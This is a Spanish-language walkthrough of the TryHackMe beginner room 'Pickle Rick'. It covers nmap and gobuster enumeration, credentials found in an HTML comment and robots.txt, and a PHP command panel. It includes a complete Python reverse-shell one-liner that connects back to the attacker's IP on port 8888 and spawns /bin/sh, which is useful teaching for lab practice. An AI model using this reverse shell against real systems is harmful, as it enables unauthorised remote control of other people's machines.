![image](https://github.com/user-attachments/assets/7d17c77b-532d-4103-9629-256c265b32a0)# Guia_Pickle_Rick
Maquina para principiantes de TryHackMe, pensada para usar herramientas y técnicas básicas

# Recursos requeridos en el procedimiento:
  Estos recusos son necesario pero de igual manera los explicare de manera correspondiente.
  Cada palabra esa enlaca a documentacion en caso de quede profundizar

## _[Nmap](https://nmap.org/docs.html)_
- Un herramienta de escaneo de puertos.

## _[Gobuster](https://hackertarget.com/gobuster-tutorial/)_
- Una herramienta de escaneo de redes

## _[Kali-Linux](https://www.kali.org/docs/)_
- Un sistema operativo pensado para realizar pruebas de penetración avanzadas y auditorías de seguridad.

## _[Python](https://www.python.org/)_
- Un lenguaje de programacion. (solo ocupa entenderlo)

## _[HTML](https://developer.mozilla.org/es/docs/Web/HTML)_
- Lenguaje de etiquetas de hipertexto
## _[JavaScritp](https://developer.mozilla.org/es/docs/Web/JavaScript)_
- Lenguaje de Programacion (Entender el codigo) 

## _[PHP](https://www.strato.es/faq/hosting/que-es-php-y-como-lo-utilizo/)_

- Es un lenguaje de programación versátil que se ejecuta en el servidor

## Conceptos basicos para la maquina

- Revershell
- SHH
- Directorios
- Puertos y servicios

# Paso a paso 
![image](https://github.com/user-attachments/assets/b857d3e8-d271-437c-ba27-0cc06009ccab)
- *&* Ejecuta el comando en segundo plano.
  
Primero nos conectamos a la VPN de TryHackMe usando [OpenVPN](https://openvpn.net/as-docs/linux.html#tutorial--connect-from-linux) una ves conectados procedemos con un escaneo de red. 

Una vez conectados haremos un esceneo del equipo con Nnmap 
 -  Nota: TryHackme nos da la IP del odjetivo.
    
   ![image](https://github.com/user-attachments/assets/af097b5c-798d-4626-bf29-c02cac5ad01c)


![image](https://github.com/user-attachments/assets/dcc76218-3fa2-494b-beb7-47fd02dc1abe)

Podemos ver Dos puertos abiertos: 
- Puerto 22/tcp shh : Es protocolo de red para controlar un dispositivo de manera remota.
- Puerto 80/tcp http: Estan corriendo una pagina web en ese equipo.

Lo mejor seria buscar en la web alguna vulnerabilidad.

![image](https://github.com/user-attachments/assets/680b0410-d1c8-4c36-976c-a09782b83287)

![image](https://github.com/user-attachments/assets/4578cd72-83bf-4c9b-bb25-c1f1e04427f1)

Aqui podemos ver cual es el objetivo de este laboratorio. 

ahora como primer paso se pueden hacer dos cosas que seria usar "Gobuster" para buscar directorios ocultos o podemos inspeccionar el codigo fuente de la pagina(CTRL+U).

En mi caso inspeccione la pagina primero:
![image](https://github.com/user-attachments/assets/527cb5b3-5c72-4916-a8d0-2925e7f3246f)

Podemos notar que Rick comento su codigo y puso una nota para si mismo, donde se mencion un usuario.

### Username: R1ckRul3s

Despues eso no se ve nada mas relevante por lo procedemos a usar "Gobuster". 

## Como instalar _Gobuster_:
- Simplemete pon esto en la terminal `sudo apt install gobuster`

  Una vez instalado procedemos a llamarlo.
  ![image](https://github.com/user-attachments/assets/e058efed-7b37-452c-a7fd-862663b318e6)
- Ente comando podemos ver mucha informacion entre ella
- `gobuster` llama la herramienta.
- `dir` Utiliza el modo de enumeración de directorios/archivos
- `http://10.10.117.130` Se indicar la pagina que se desa analizar.
- `-w` es para indicarle a "Gobuster" que se le entregara un diccionario.
- `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
- `-x` es para buscar ciertos tipo de archivos en este caso especificamos: php,sh,txt,cgi,etc..

Para mas detalles de _[Gobuster](https://hackertarget.com/gobuster-tutorial/)_

![image](https://github.com/user-attachments/assets/15d20262-9812-490e-a163-78ae43e4d947)

Yo termine el proceso cuando vi que no estaba consiguiendo nada mas. 

### Observaciones: 
![image](https://github.com/user-attachments/assets/7fd0ce21-2d9f-490a-be65-ae2347d518c8)

vemos un archivo en terminacion `.txt` esto quiere decir que es texto. 
ademas un directorio que dice `/assets` podemos revisar para averiguar algo.
Pero mas importante vemos un directorio `/login.php`.

Puedes revisar cual gustes aqui solo pondres los que son importantes.

### Revisando el `/robots.txt`

![image](https://github.com/user-attachments/assets/0a78485b-7fa2-452f-a394-a2fc2473cdc0)

- Vemos un texto, lo guadaremos en caso de que se nos pida alguna contraseña. 

### Revisando `/login.php`

![image](https://github.com/user-attachments/assets/0dcfa508-a00b-413e-8d2e-18dc989c1d9b)

Podemos ver que es una pagina de login 

anterior mente encontramos un usuario en un comentario del code: R1ckRul3s
y tambien encontramos una palabra en `/robots.txt`.

![image](https://github.com/user-attachments/assets/9e777166-868d-4b1c-8d2c-5a246b95a155)

Como podemo ser es una terminal de php por lo que podemos ejecutar comando en el equipo. 
pero para estar seguros ejecutamos un comando `whoami` para ver quien somos, en este caso somos `www-data` 

ahora averiguaremos que archivos puedo ver con `ls`.

![image](https://github.com/user-attachments/assets/9eaebf1a-8277-4626-8afe-a0f197a656d4)

Vemos varios textos por lo que usaremos `nl` para sobreleer la informacion del texto.

![image](https://github.com/user-attachments/assets/29089b17-e650-4716-804d-dac6c27e09a6)

### Primera flag: mr. meeseek hair

entreo los directorios no se ve nada interesante por lo que nos interesaria intentar hacer una [reverse shell](https://www.swhosting.com/es/blog/uso-del-comando-grep-en-sistemas-linux-unix) pero usando python3.

pero no sabemos si ese sistema tiene python instalado por lo que lo verificaremos.

![image](https://github.com/user-attachments/assets/eb05ef62-0b1b-4170-a91e-2e29955b0251)

Podemos ver que efectivamente responde por lo que ejecutaremos script de python para hacer reverse shell.

![image](https://github.com/user-attachments/assets/6345f700-db07-457c-8cbd-0fc076df5119)

Sabemos que el sistema usae python3 por lo que tenemos que especificar.

y ademas necesitaremos modificar el script para que nos funcione y ademas necesitamos poner un puerto a escuchar para resivir la reverse shell. 

para esto necesitamos saber cual es nuestra IP en mi casa:

![image](https://github.com/user-attachments/assets/ab5cc452-d7f8-4127-97a9-dafcba7f04b7)

tenemos tambien que acitvar un puerto en nuestro equipo para recibir, yo escogi el puerto 8888.

![image](https://github.com/user-attachments/assets/62adebd4-dc76-4a71-af67-9a0fbb1b582e)

y con eso queda pendiente a la reverse shell.

`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.21.35.128",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

IP: 10.21.35.128 - Puerto: 8888 

![image](https://github.com/user-attachments/assets/18a29b99-c10c-42b0-8048-75314c2979a2)

Una ves ejecutado podemos ver que el puerto ha recibido la reverse shell.

![image](https://github.com/user-attachments/assets/06d3e158-6ed9-4abc-b53d-3ca24a899813)

ahora para tener una mejor interfaz ejecutamos el siguiente escript `script /dev/null -c bash`.

![image](https://github.com/user-attachments/assets/c0c71bc3-228c-4c10-a68b-c70dd9eb7577)

lo que nos da una interfaz que nos muesta quienes somo y donde estamos. 











